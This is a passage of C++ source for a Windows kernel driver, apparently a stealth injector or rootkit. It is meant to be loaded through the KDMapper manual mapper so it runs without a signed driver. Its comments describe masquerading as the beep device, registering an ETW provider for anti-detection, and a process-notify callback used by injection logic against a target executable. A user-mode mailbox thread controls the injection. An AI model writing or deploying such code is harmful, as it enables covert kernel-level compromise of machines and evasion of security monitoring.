        interval.QuadPart = -5000000LL; // 500ms
        KeDelayExecutionThread(KernelMode, FALSE, &interval);
    }

    DbgPrint("[AudioKSE] Mailbox polling thread exiting\n");
    PsTerminateSystemThread(STATUS_SUCCESS);
}

// ============================================================================
// DRIVER INITIALIZATION
// ============================================================================

NTSTATUS EliteDriverInit(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrint("===============================================\n");
    DbgPrint("=== ELITE KERNEL DRIVER LOADING ===\n");
    DbgPrint("=== Target: AudioDiagnostic.exe ===\n");
    DbgPrint("===============================================\n");

    ELITE_DBG("Elite driver initializing\n");

    g_pDriverObject = DriverObject;
    KeInitializeEvent(&g_UnloadEvent, NotificationEvent, FALSE);

    // Generate hardware ID
    g_ullHardwareId = GenerateHardwareId();
    ELITE_DBG("Hardware ID: 0x%llX\n", g_ullHardwareId);

    // Set up driver unload
    DriverObject->DriverUnload = DriverUnload;

    // Set dispatch routines
    for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        DriverObject->MajorFunction[i] = FilterDispatchPassThrough;
    }
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = FilterDispatchDeviceControl;

    // Attach to beep device for masquerading
    NTSTATUS status = AttachToBeepDevice();
    if (!NT_SUCCESS(status)) {
        ELITE_DBG("Failed to attach to beep device: 0x%X\n", status);
        return status;
    }

    // Register ETW provider for anti-detection
    status = RegisterEtwProvider();
    if (!NT_SUCCESS(status)) {
        ELITE_DBG("Warning: ETW provider init failed: 0x%X\n", status);
        // Not fatal - continue
    }

    // Register process notify callback (used by injection logic)
    status = PsSetCreateProcessNotifyRoutine(ProcessNotifyCallback, FALSE);
    if (!NT_SUCCESS(status)) {
        ELITE_DBG("Failed to register process notify: 0x%X\n", status);
        return status;
    }

    // Start mailbox polling thread
    HANDLE hThread = nullptr;
    status = PsCreateSystemThread(
        &hThread,
        THREAD_ALL_ACCESS,
        nullptr,
        nullptr,
        nullptr,
        MailboxPollingThread,
        nullptr
    );

    if (!NT_SUCCESS(status)) {
        ELITE_DBG("Failed to create mailbox thread: 0x%X\n", status);
        return status;
    }

    ZwClose(hThread);
    ELITE_DBG("Mailbox polling thread started - waiting for user mode connection\n");

    DbgPrint("===============================================\n\n");
    return STATUS_SUCCESS;
}

// ============================================================================
// DRIVER ENTRY - Works with both KDMapper and sc start
// ============================================================================

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    // CRITICAL: Print FIRST to verify DriverEntry is called
    DbgPrint("=== DRIVER ENTRY CALLED ===\n");
    DbgPrint("DriverObject: 0x%p\n", DriverObject);

    NTSTATUS status;

    // If we have a valid DriverObject (some manual mappers provide it), use it directly
    if (DriverObject != nullptr) {
        DbgPrint("=== Using provided DriverObject (Manual Map with valid object) ===\n");
        status = EliteDriverInit(DriverObject, RegistryPath);
        DbgPrint("=== EliteDriverInit returned: 0x%X ===\n", status);
        return status;
    }

    // KDMapper and most manual mappers pass NULL - try IoCreateDriver
    DbgPrint("=== DriverObject is NULL - trying IoCreateDriver ===\n");
    UNICODE_STRING driverName;
    RtlInitUnicodeString(&driverName, L"\\Driver\\AudioKSE");

    status = IoCreateDriver(&driverName, &EliteDriverInit);
    DbgPrint("=== IoCreateDriver returned: 0x%X ===\n", status);

    if (!NT_SUCCESS(status)) {
        DbgPrint("=== IoCreateDriver FAILED (0x%X)! Using KDMapper-compatible mode ===\n", status);
        DbgPrint("=== Skipping device creation, running core functionality only ===\n");

        // KDMapper mode: Skip DriverObject-dependent features
        // Just do the core injection without filter device

        g_pDriverObject = nullptr;  // Mark as manual map mode
        KeInitializeEvent(&g_UnloadEvent, NotificationEvent, FALSE);

        // Generate hardware ID
        g_ullHardwareId = GenerateHardwareId();
        DbgPrint("[AudioKSE] Hardware ID: 0x%llX\n", g_ullHardwareId);

        // Start mailbox polling thread (no callbacks needed!)
        DbgPrint("[AudioKSE] Starting mailbox polling thread (KDMapper compatible)\n");

        HANDLE hThread = nullptr;
        status = PsCreateSystemThread(
            &hThread,
            THREAD_ALL_ACCESS,
            nullptr,
            nullptr,
            nullptr,
            MailboxPollingThread,
            nullptr
        );

        if (!NT_SUCCESS(status)) {
            DbgPrint("=== CRITICAL: Failed to create mailbox thread: 0x%X ===\n", status);
            return status;
        }

        ZwClose(hThread);
        DbgPrint("=== Mailbox thread started successfully ===\n");
        DbgPrint("=== User mode: Find g_Mailbox, write PID, set Command=1 ===\n");

        DbgPrint("===============================================\n\n");
        return STATUS_SUCCESS;
    }

    DbgPrint("=== IoCreateDriver succeeded ===\n");
    return status;
}
